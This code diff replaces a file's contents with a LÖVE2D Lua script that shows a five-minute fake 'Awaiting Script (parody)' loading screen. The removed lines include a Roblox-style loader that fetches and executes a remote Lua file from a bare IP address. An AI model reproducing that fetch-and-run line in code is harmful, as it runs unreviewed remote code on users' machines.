@@ -1,3 +1,117 @@
+-- main.lua
+-- Fake game loading screen (visual only). Duration = 300s (5 minutes)
 
-ID="05e6fa52-8ff5-40d1-961c-92b7fc573f5d";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+local duration = 300            -- seconds (5 minutes)
+local timer = 0
+local bg, font
+
+function love.load()
+    -- Try to load a background image called "background.png" (optional)
+    if love.filesystem.getInfo("background.png") then
+        bg = love.graphics.newImage("background.png")
+    end
+
+    font = love.graphics.newFont(20)
+    love.graphics.setFont(font)
+
+    -- UI settings
+    bar = {
+        x = 100,
+        y = love.graphics.getHeight() - 140,
+        w = love.graphics.getWidth() - 200,
+        h = 28,
+        border = 3
+    }
+end
+
+function love.update(dt)
+    if timer < duration then
+        timer = timer + dt
+        if timer > duration then timer = duration end
+    end
+end
+
+local function formatTime(seconds)
+    seconds = math.max(0, math.floor(seconds + 0.5))
+    local m = math.floor(seconds / 60)
+    local s = seconds % 60
+    return string.format("%02d:%02d", m, s)
+end
+
+function love.draw()
+    local w, h = love.graphics.getWidth(), love.graphics.getHeight()
+
+    -- Background
+    if bg then
+        -- draw background scaled to cover canvas
+        local sx = w / bg:getWidth()
+        local sy = h / bg:getHeight()
+        love.graphics.draw(bg, 0, 0, 0, sx, sy)
+    else
+        -- fallback dark gradient-like background
+        love.graphics.clear(15/255, 15/255, 20/255)
+    end
+
+    -- Title
+    love.graphics.setColor(1, 1, 1)
+    local titleFont = love.graphics.newFont(36)
+    love.graphics.setFont(titleFont)
+    local title = "Awaiting Script (parody)"
+    love.graphics.printf(title, 0, 80, w, "center")
+
+    -- Subtitle / status lines
+    love.graphics.setFont(font)
+    local status = "System check: OK  |  Verifying modules (simulation)"
+    love.graphics.printf(status, 0, 140, w, "center")
+
+    -- Progress bar background
+    local progress = math.min(timer / duration, 1)
+    love.graphics.setColor(0, 0, 0, 0.6)
+    love.graphics.rectangle("fill", bar.x - bar.border, bar.y - bar.border,
+        bar.w + bar.border*2, bar.h + bar.border*2, 6, 6)
+
+    -- Bar empty
+    love.graphics.setColor(0.12, 0.12, 0.12)
+    love.graphics.rectangle("fill", bar.x, bar.y, bar.w, bar.h, 6, 6)
+
+    -- Bar fill
+    love.graphics.setColor(0.2, 0.7, 1) -- bluish fill
+    love.graphics.rectangle("fill", bar.x, bar.y, bar.w * progress, bar.h, 6, 6)
+
+    -- Percentage + time remaining
+    love.graphics.setColor(1, 1, 1)
+    local percent = math.floor(progress * 100)
+    local remaining = formatTime(duration - timer)
+    local label = string.format("%d%%   •   Estimated wait: %s", percent, remaining)
+    love.graphics.printf(label, 0, bar.y - 40, w, "center")
+
+    -- Small "status log" lines (simulate scrolling statuses)
+    local logY = bar.y + 60
+    local logs = {
+        "Initializing secure scripts...",
+        "Loading assets...",
+        "Verifying checksums (simulation)...",
+        "Preparing environment...",
+        "Finalizing..."
+    }
+    -- pick a log index that slowly cycles (purely aesthetic)
+    local idx = 1 + math.floor((timer * 0.4) % #logs)
+    love.graphics.setFont(love.graphics.newFont(14))
+    love.graphics.printf("> " .. logs[idx], 120, logY, w - 240, "left")
+
+    -- If finished
+    if progress >= 1 then
+        love.graphics.setFont(titleFont)
+        love.graphics.setColor(0.8, 1, 0.6)
+        love.graphics.printf("Ready (simulation)", 0, bar.y - 120, w, "center")
+    end
+end
+
+function love.keypressed(key)
+    -- allow skipping in development by pressing Escape (optional)
+    if key == "escape" then
+        love.event.quit()
+    end
+end
+
+
